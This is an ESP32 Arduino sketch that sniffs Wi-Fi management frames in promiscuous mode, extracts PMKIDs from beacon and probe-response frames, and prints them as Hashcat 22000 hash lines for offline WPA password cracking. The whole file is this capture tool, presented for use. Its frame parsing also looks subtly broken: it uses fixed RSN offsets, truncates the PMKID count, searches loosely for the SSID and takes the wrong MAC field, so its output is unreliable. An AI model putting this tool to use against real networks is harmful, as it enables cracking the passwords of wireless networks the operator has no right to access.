#include <WiFi.h>
#include "esp_wifi.h"

// Callback function to process received packets
void promiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return; // Only process management frames

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *payload = pkt->payload;

    // Parse the 802.11 header
    uint8_t frameType = payload[0] & 0xFC; // Frame type and subtype
    if (frameType != 0x80 && frameType != 0x50) return; // Beacon or Probe Response

    // Locate the RSN Information Element (if present)
    int payloadLen = pkt->rx_ctrl.sig_len;
    for (int i = 36; i < payloadLen - 2; i++) {
        if (payload[i] == 0x30) { // RSN IE ID
            uint8_t rsnLen = payload[i + 1];
            if (rsnLen < 20) break; // Skip frames without enough RSN data
            uint8_t pmkidCount = payload[i + 14] << 8 | payload[i + 15];

            if (pmkidCount > 0) {
                uint8_t *pmkid = &payload[i + 16];
                uint8_t *apMac = &payload[10];
                uint8_t *staMac = &payload[4];

                // Extract SSID
                String ssid = "";
                for (int j = 36; j < payloadLen; j++) {
                    if (payload[j] == 0x00) { // SSID element ID
                        uint8_t ssidLen = payload[j + 1];
                        ssid = String((char *)&payload[j + 2]).substring(0, ssidLen);
                        break;
                    }
                }

                // Skip frames without an SSID
                if (ssid.length() == 0) return;

                // Convert SSID to Hex format
                String ssidHex = "";
                for (int i = 0; i < ssid.length(); i++) {
                    char hex[3];
                    sprintf(hex, "%02X", ssid[i]);
                    ssidHex += hex;
                }

                // Output in Hashcat 22000 format
                Serial.print("WPA*01*");
                for (int j = 0; j < 16; j++) {
                    Serial.printf("%02x", pmkid[j]);
                }
                Serial.print("*");
                for (int j = 0; j < 6; j++) {
                    Serial.printf("%02x", apMac[j]);
                }
                Serial.print("*");
                for (int j = 0; j < 6; j++) {
                    Serial.printf("%02x", staMac[j]);
                }
                Serial.print("*");
                Serial.print(ssidHex); // Output SSID in hex
                Serial.println("***");
            }
            break;
        }
    }
}

void setup() {
    Serial.begin(921600);
    WiFi.mode(WIFI_MODE_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    Serial.println("Listening for PMKIDs...");
}

void loop() {
    // Main loop does nothing; all processing happens in the callback
    delay(1000);
}
